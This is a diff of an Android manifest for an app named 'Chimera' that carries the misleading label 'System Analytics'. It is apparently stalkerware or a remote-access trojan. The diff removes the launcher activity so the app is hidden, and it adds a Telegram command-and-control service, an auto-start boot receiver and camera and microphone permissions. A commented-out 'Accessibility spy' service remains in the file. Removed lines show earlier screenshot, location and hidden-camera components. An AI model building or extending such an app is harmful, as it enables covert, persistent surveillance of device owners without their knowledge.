@@ -1,28 +1,19 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools">
-    
+
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.INTERNET" />
-    <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
-    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
-    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
-    <uses-permission android:name="android.permission.CAMERA" />
-    <uses-permission android:name="android.permission.RECORD_AUDIO" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
-    
-    <!-- THIS IS THE FINAL, CRITICAL, MISSING PERMISSION -->
-    <uses-permission android:name="android.permission.CAPTURE_VIDEO_OUTPUT" tools:ignore="ProtectedPermissions" />
 
-    <uses-feature android:name="android.hardware.camera.any" />
+    <!-- Optional Camera & Mic for future use -->
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
 
     <application
-        android:name=".ChimeraApplication" 
+        android:name=".ChimeraApplication"
         android:allowBackup="false"
-        android:dataExtractionRules="@null"
-        android:fullBackupContent="false"
         android:icon="@mipmap/ic_launcher"
         android:label="System Analytics"
         android:roundIcon="@mipmap/ic_launcher_round"
@@ -30,20 +21,22 @@
         android:theme="@style/Theme.Chimera"
         tools:targetApi="34">
 
-        <activity
-            android:name=".MainActivity"
+        <service
+            android:name=".TelegramC2Service"
+            android:exported="false"
+            android:foregroundServiceType="dataSync" />
+
+        <receiver
+            android:name=".BootReceiver"
+            android:enabled="true"
             android:exported="true">
             <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
             </intent-filter>
-        </activity>
+        </receiver>
 
-        <activity
-            android:name=".ProxyActivity"
-            android:exported="false"
-            android:theme="@style/Theme.AppCompat.Transparent.NoActionBar" />
-
+        <!-- Keep this later if you want Accessibility spy -->
+        <!--
         <service
             android:name=".CoreService"
             android:exported="false"
@@ -55,33 +48,7 @@
                 android:name="android.accessibilityservice"
                 android:resource="@xml/accessibility_service_config" />
         </service>
+        -->
 
-        <service
-            android:name=".ScreenshotService"
-            android:enabled="true"
-            android:exported="false"
-            android:foregroundServiceType="mediaProjection" />
-
-        <service
-            android:name=".FCMService"
-            android:exported="false">
-            <intent-filter>
-                <action android:name="com.google.firebase.MESSAGING_EVENT" />
-            </intent-filter>
-        </service>
-        
-        <receiver
-            android:name=".CoreService$BootReceiver"
-            android:enabled="true"
-            android:exported="true">
-            <intent-filter>
-                <action android:name="android.intent.action.BOOT_COMPLETED"/>
-            </intent-filter>
-        </receiver>
-
-        <activity
-            android:name=".CameraActivity"
-            android:exported="false"
-            android:theme="@style/Theme.AppCompat.Transparent.NoActionBar" />
     </application>
 </manifest>
